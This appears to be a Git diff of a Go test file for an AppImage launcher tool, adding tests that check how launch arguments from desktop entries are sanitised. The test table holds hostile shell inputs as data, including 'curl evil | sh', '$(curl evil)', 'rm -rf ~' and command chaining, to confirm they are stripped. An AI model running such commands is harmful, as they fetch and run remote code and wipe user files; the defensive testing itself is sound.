@@ -96,7 +96,8 @@ func TestDesktopFile(t *testing.T) {
 	}
 	for _, want := range []string{
 		"Name=Example Notes\n",
-		"Exec=\"/home/u/.local/share/uas/appimages/example__notes.AppImage\" %U\n",
+		// The app's own launch arguments are kept; its command is not.
+		"Exec=\"/home/u/.local/share/uas/appimages/example__notes.AppImage\" --no-sandbox %U\n",
 		"Icon=/home/u/.local/share/uas/icons/example__notes.png\n",
 		"MimeType=text/markdown;\n",
 		"X-UAS-Source=github:example/notes\n",
@@ -105,7 +106,7 @@ func TestDesktopFile(t *testing.T) {
 			t.Errorf("missing %q in\n%s", want, got)
 		}
 	}
-	if strings.Contains(got, "rm -rf") || strings.Contains(got, "--no-sandbox") || strings.Contains(got, "Desktop Action") {
+	if strings.Contains(got, "rm -rf") || strings.Contains(got, "AppRun") || strings.Contains(got, "Desktop Action") {
 		t.Errorf("copied an untrusted command:\n%s", got)
 	}
 
@@ -198,5 +199,50 @@ func TestMetainfoOfTheApp(t *testing.T) {
 	})
 	if err != nil || info.Metainfo != nil {
 		t.Errorf("a library's metainfo was used: %q, %v", info.Metainfo, err)
+	}
+}
+
+func TestLaunchArgs(t *testing.T) {
+	for exec, want := range map[string]string{
+		// What apps ship: the command goes, its arguments stay.
+		"AppRun --no-sandbox %U":               "--no-sandbox %U",
+		"ghostty --gtk-single-instance=true":   "--gtk-single-instance=true",
+		"helium %U":                            "%U",
+		"AppRun":                               "",
+		"":                                     "",
+		"app --profile default --port=8080 %F": "--profile default --port=8080 %F",
+		"env GDK_BACKEND=x11 FOO=1 app --flag %u": "--flag %u",
+		"app %U %F":                                   "%U", // one placeholder
+		"app --icon %i --name %c %k %U":               "--icon --name %U",
+		"/usr/bin/app --config=/etc/app.conf,x:y+z@h": "--config=/etc/app.conf,x:y+z@h",
+		// Anything that isn't plain: only the placeholder, as before uas kept arguments.
+		`app --title "My App" %U`:   "%U",
+		"app --run=$(curl evil) %F": "%F",
+		"sh -c 'curl evil | sh'":    "",
+		"app --a;rm -rf ~":          "",
+		"app `id` %u":               "%u",
+		"app --path=C:\\dir %U":     "%U",
+		"app --x=1 && other --y %F": "%F",
+		"app --redirect>/tmp/out":   "",
+		"app --glob=* %U":           "%U",
+		"rm -rf ~":                  "",
+	} {
+		if got := LaunchArgs(exec); got != want {
+			t.Errorf("LaunchArgs(%q) = %q, want %q", exec, got, want)
+		}
+	}
+	// With no Exec of its own to read, an entry's launcher takes the arguments uas recorded, made safe the
+	// same way.
+	for args, want := range map[string]string{"--gtk-single-instance=true": " --gtk-single-instance=true\n",
+		"--x; rm -rf ~": "\n", "": "\n"} {
+		got, err := DesktopFile(Entry{Name: "Ghostty", AppImage: "/a/ghostty.AppImage", Args: args}, map[string]string{})
+		if err != nil || !strings.Contains(got, "Exec=\"/a/ghostty.AppImage\""+want) {
+			t.Errorf("Args %q: %v\n%s", args, err, got)
+		}
+	}
+	// An entry that can be read is asked instead.
+	got, _ := DesktopFile(Entry{Name: "X", AppImage: "/a/x.AppImage", Args: "--stale"}, map[string]string{"Exec": "x --fresh %U"})
+	if !strings.Contains(got, "Exec=\"/a/x.AppImage\" --fresh %U\n") {
+		t.Errorf("own arguments not used:\n%s", got)
 	}
 }
